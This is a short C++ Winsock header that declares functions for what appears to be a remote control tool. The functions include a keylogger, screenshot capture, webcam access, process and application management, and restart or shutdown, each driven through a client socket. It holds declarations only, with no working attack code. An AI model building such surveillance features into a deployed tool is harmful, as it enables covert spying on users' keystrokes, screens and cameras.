#pragma once
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>

void ApplicationManager(SOCKET client, std::string msg1, std::string msg2);
void ProcessManager(SOCKET client, std::string msg1, std::string msg2);
void KeyLogger(SOCKET client, std::string msg);
void ScreenShot(SOCKET client, std::string msg);
void openWebcam(SOCKET client, std::string msg);
void restartPC(SOCKET client, std::string msg);
void shutdownPC(SOCKET client, std::string msg);